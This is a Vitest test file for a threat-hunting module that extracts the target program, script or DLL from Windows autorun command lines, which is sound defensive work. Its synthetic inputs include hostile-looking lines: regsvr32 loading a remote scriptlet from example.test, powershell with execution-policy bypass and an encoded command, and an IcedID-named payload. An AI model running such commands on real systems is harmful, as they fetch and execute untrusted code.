import { describe, expect, it } from "vitest";
import {
  SCRIPT_HOST_TOOLS,
  expandEnv,
  huntCommandTarget,
  splitCommandLine,
} from "../../src/analysis/veloCommandTarget.js";

// The hunt target of an autorun command (#2748): the program, or the script / DLL a script host or
// built-in tool runs. All command lines here are synthetic.
describe("splitCommandLine", () => {
  it("keeps a quoted path with spaces whole", () => {
    expect(splitCommandLine('"C:\\Program Files\\Upd\\upd.exe" /bg')).toEqual({
      program: "C:\\Program Files\\Upd\\upd.exe",
      rest: "/bg",
    });
  });

  it("reads an unquoted path with spaces up to its extension", () => {
    expect(splitCommandLine("C:\\Program Files\\X\\x.exe -a")).toEqual({
      program: "C:\\Program Files\\X\\x.exe",
      rest: "-a",
    });
  });

  it("falls back to the first word with no extension", () => {
    expect(splitCommandLine('wscript "c:\\a\\b.vbs"')).toEqual({
      program: "wscript",
      rest: '"c:\\a\\b.vbs"',
    });
  });
});

describe("huntCommandTarget", () => {
  it("a plain program is its own target (quoted, unquoted, bare)", () => {
    expect(huntCommandTarget('"C:\\Program Files\\Upd\\upd.exe" /bg')).toBe(
      "C:\\Program Files\\Upd\\upd.exe",
    );
    expect(huntCommandTarget("C:\\Program Files\\X\\x.exe -a")).toBe("C:\\Program Files\\X\\x.exe");
    expect(huntCommandTarget("C:\\Tools\\same.exe")).toBe("C:\\Tools\\same.exe");
    expect(huntCommandTarget("notepad.exe")).toBe("notepad.exe");
  });

  it("expands %SystemRoot% and friends", () => {
    expect(huntCommandTarget("%SystemRoot%\\system32\\x.exe")).toBe("C:\\Windows\\system32\\x.exe");
    expect(expandEnv("%LOCALAPPDATA%\\u\\u.exe")).toBe("C:\\Users\\user\\AppData\\Local\\u\\u.exe");
    expect(expandEnv("%NOT_KNOWN%\\a.exe")).toBe("%NOT_KNOWN%\\a.exe");
    expect(expandEnv("%constructor%\\a.exe")).toBe("%constructor%\\a.exe"); // no inherited lookups
  });

  it("regsvr32: the /i: payload, not the trailing scrobj.dll", () => {
    expect(huntCommandTarget("regsvr32.exe", "/s /u /i:C:\\p\\icedid_artifact.bin scrobj.dll")).toBe(
      "C:\\p\\icedid_artifact.bin",
    );
  });

  it("wscript with a quoted script path", () => {
    expect(huntCommandTarget('wscript "c:\\Program Files\\sysinternals\\bginfo.vbs"')).toBe(
      "c:\\Program Files\\sysinternals\\bginfo.vbs",
    );
  });

  it("rundll32: the DLL without its entry point", () => {
    expect(huntCommandTarget("rundll32 C:\\x\\y.dll,Entry")).toBe("C:\\x\\y.dll");
  });

  it("powershell -File with a script, and cmd /c with a batch file plus arguments", () => {
    expect(huntCommandTarget("powershell.exe", '-NoP -ExecutionPolicy Bypass -File "C:\\s\\a b.ps1"')).toBe(
      "C:\\s\\a b.ps1",
    );
    expect(huntCommandTarget('cmd.exe /c "C:\\s\\run.bat arg1"')).toBe("C:\\s\\run.bat");
  });

  it("a script host with no clear script gives no target (the entry name keys the item)", () => {
    expect(huntCommandTarget("powershell.exe", "-enc SQBFAFgA")).toBeUndefined();
    expect(huntCommandTarget("cmd /c start foo")).toBeUndefined();
    expect(huntCommandTarget("regsvr32.exe", "/s /i:http://example.test/x.sct scrobj.dll")).toBeUndefined();
    expect(huntCommandTarget("cmd.exe /c C:\\Windows\\System32\\rundll32.exe x.dll")).toBeUndefined();
    expect(huntCommandTarget("mshta.exe")).toBeUndefined();
  });

  it("nothing that looks like a program gives no target", () => {
    expect(huntCommandTarget("")).toBeUndefined();
    expect(huntCommandTarget("[.ShellClassInfo] LocalizedResourceName")).toBeUndefined();
  });

  it("the tool list is a named constant holding the usual script hosts", () => {
    for (const t of ["powershell.exe", "pwsh.exe", "cmd.exe", "wscript.exe", "cscript.exe", "mshta.exe"])
      expect(SCRIPT_HOST_TOOLS.has(t)).toBe(true);
    expect(SCRIPT_HOST_TOOLS.has("regsvr32.exe") && SCRIPT_HOST_TOOLS.has("rundll32.exe")).toBe(true);
  });
});
